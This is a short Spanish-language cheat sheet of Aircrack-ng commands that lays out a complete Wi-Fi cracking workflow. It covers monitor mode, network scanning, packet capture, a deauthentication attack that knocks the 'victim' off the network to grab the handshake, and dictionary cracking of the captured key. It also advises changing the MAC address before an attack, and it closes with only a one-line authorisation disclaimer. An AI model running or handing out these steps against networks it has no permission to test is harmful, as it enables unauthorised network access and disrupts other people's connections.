# 📡 Comandos esenciales para Aircrack-ng

## 1️⃣ Verificar la interfaz de red
Para listar las interfaces de red disponibles:

```bash
airmon-ng
```

## 2️⃣ Habilitar el modo monitor
Sustituye `wlan0` por el nombre de tu interfaz:

```bash
airmon-ng start wlan0
```

## 3️⃣ Escanear redes disponibles
Para ver las redes Wi-Fi cercanas:

```bash
airodump-ng wlan0mon
```

## 4️⃣ Capturar paquetes de una red específica
Ejemplo de captura en un archivo:

```bash
airodump-ng -c [canal] --bssid [BSSID] -w captura wlan0mon
```
- `[canal]`: Canal en el que opera la red.
- `[BSSID]`: Dirección MAC del router.
- `-w captura`: Guarda la captura en un archivo llamado `captura`.

## 5️⃣ Desautenticar clientes (ataque de deautenticación)
Para expulsar dispositivos de una red y capturar el handshake:

```bash
aireplay-ng -0 5 -a [BSSID] -c [MAC_cliente] wlan0mon
```
- `-0 5`: Envía 5 paquetes de deautenticación.
- `[BSSID]`: MAC del router.
- `[MAC_cliente]`: MAC de la víctima (opcional).

## 6️⃣ Crackear la clave Wi-Fi
Si se obtuvo el handshake, usar un diccionario:

```bash
aircrack-ng -w diccionario.txt -b [BSSID] captura.cap
```
- `-w diccionario.txt`: Diccionario de contraseñas.
- `-b [BSSID]`: MAC del router.
- `captura.cap`: Archivo de captura.

## 7️⃣ Desactivar el modo monitor
Para volver al modo normal:

```bash
airmon-ng stop wlan0mon
```

## 🔥 Consejos adicionales
- Usa `iwconfig` para verificar el estado de las interfaces.
- Usa `ifconfig wlan0 down` y `macchanger -r wlan0` para cambiar la MAC antes de un ataque.
- Asegúrate de tener permisos de root (`sudo su`).

🚨 **Solo úsalo en redes de tu propiedad o con autorización.**
